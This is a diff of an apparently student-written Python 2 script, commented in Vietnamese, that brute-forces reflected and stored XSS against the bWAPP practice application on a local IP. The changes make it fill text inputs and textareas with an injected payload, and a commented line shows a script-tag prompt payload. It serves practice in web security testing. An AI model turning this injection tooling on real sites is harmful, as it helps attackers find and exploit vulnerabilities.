@@ -24,7 +24,7 @@ _site = ''
 def login():
     dataForm = {'login': 'bee', 'password': 'bug', 'security_level': 2, 'form': 'submit'}
     session.post ('http://192.168.141.145/bWAPP/login.php', data=dataForm)
-    print "login thanh cong"
+    print "login thanh cong 1"
 
 def wordlistimport(file,lst):
 		try:
@@ -182,18 +182,27 @@ def getDataUrl(urlInput,payload):
     for x in formArr:
         # tim tat ca the input trong form
         inputs = x.find_all ('input')
+        textares = x.find_all('textarea')
 
         # payString = urlInput
         # dem = 0
         # neu tim co the input trong form
-        if inputs:
+        if inputs or textares:
             # tim tat ca cac the input lay du lieu
             dataForm = {}
             dataForm['form'] = 'submit'
             for y in inputs:
                 # lay attrs name cua the input
+                if y.attrs['type']=="text":
+                    name = y.attrs['name']
+                    dataForm[name] = payload
+                else:
+                    name = y.attrs['name']
+                    dataForm[name]=y.attrs['value']
+
+            for y in textares:
                 name = y.attrs['name']
-                dataForm[name]=payload
+                dataForm[name] = payload
 
         if dataForm:
             payloadArr.append (dataForm)
@@ -260,7 +269,7 @@ def storeXss():
 
 
 if __name__ == '__main__':
-    # login()
+    login()
     brutexss()
 
     stt = 0
@@ -268,7 +277,7 @@ if __name__ == '__main__':
         print Fore.RED + 30*'-' +" XSS Vulnerable "+30*'-'
         print Fore.RED + "[!] " + str(x)
         # print x
-    print 30*"-"+" Finish "+30*"-"
+    print 20*"-"+" Finish "+20*"-"
 
     # getFormFrom_Url('http://192.168.141.144/bWAPP/xss_get.php',session,'</script>"><script>prompt(1)</script>')
 
